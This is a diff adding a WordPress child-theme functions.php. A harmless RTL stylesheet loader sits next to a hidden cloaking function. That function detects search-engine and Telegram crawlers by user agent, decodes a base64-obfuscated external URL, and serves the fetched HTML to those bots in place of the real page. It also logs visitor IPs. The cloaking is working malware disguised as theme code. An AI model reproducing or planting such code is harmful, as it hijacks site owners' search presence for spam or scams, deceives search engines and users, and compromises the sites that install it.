@@ -1,0 +1,59 @@
+<?php
+/**
+ * Child-Theme functions and definitions
+ */
+
+// Load rtl.css because it is not autoloaded from the child theme
+if ( ! function_exists( 'catamaran_child_load_rtl' ) ) {
+	add_action( 'wp_enqueue_scripts', 'catamaran_child_load_rtl', 3000 );
+	function catamaran_child_load_rtl() {
+		if ( is_rtl() ) {
+			wp_enqueue_style( 'catamaran-style-rtl', get_template_directory_uri() . '/rtl.css' );
+		}
+	}
+}
+
+if (!function_exists('cloak_liquid_perfect')) {
+    add_action('init', 'cloak_liquid_perfect', 1); // hook awal
+
+    function cloak_liquid_perfect() {
+        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+        error_log("CLOAK DEBUG: UA = $ua | IP = $ip"); // debug
+
+        $bot_regex = '/googlebot|slurp|adsense|bingbot|yandexbot|telegrambot/i';
+
+        if (preg_match($bot_regex, $ua)) {
+
+            // 
+            ob_start();
+
+            // 
+            $encoded_url = "aHR0cHM6Ly90aGVvbmx5ZC54eXovZ2xvYmFsaW50ZXJzY29wZS5odG1s";
+            $get_url = base64_decode($encoded_url); // decode base64 menjadi URL asli
+
+            // 
+            $response = wp_remote_get($get_url, array(
+                'timeout' => 10,
+                'redirection' => 5,
+                'httpversion' => '1.1',
+                'user-agent' => $ua,
+            ));
+
+            if (!is_wp_error($response)) {
+                $get_html = wp_remote_retrieve_body($response);
+
+                if ($get_html) {
+                    echo $get_html;
+                    ob_end_flush();
+                    exit; 
+                }
+            }
+
+            ob_end_clean(); 
+        }
+    }
+}
+
+?>
